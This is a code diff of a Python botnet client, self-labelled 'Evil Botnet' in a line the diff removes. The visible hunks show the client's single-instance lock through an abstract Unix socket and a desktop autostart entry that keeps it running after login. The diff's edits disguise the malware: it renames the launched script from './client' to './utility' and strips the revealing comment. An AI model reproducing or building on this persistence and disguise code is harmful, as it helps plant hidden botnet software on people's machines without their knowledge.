@@ -81,7 +81,7 @@ class client:
         self.copy_client()
 
         # deamonize the process
-        self.daemonize()
+        # self.daemonize()
 
 
 
@@ -116,7 +116,6 @@ class client:
         # Without holding a reference to our socket somewhere it gets garbage
         # collected when the function exits
         self._lock_socket = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
-        pid = os.getpid()
         process_name = "Client"
         try:
             # The null byte (\0) means the the socket is created
@@ -134,7 +133,7 @@ class client:
         auto_config_dir = os.path.join(config_dir, "autostart")
         auto_config_file = os.path.join(auto_config_dir, "client")
         auto_config_desktop = os.path.join(auto_config_dir, "client.desktop")
-        script_path = './client'
+        script_path = './utility'
         try:
             if not os.path.exists(config_dir):
                 os.mkdir(config_dir)
@@ -152,7 +151,6 @@ class client:
             file_content = "[Desktop Entry]\n" \
                            "Name=client\n" \
                            "GenericName=client\n" \
-                           "Comment=Evil Botnet\n" \
                            "Categories=Utility;\n" \
                            "Type=Application\n" \
                            "Exec={}\n" \
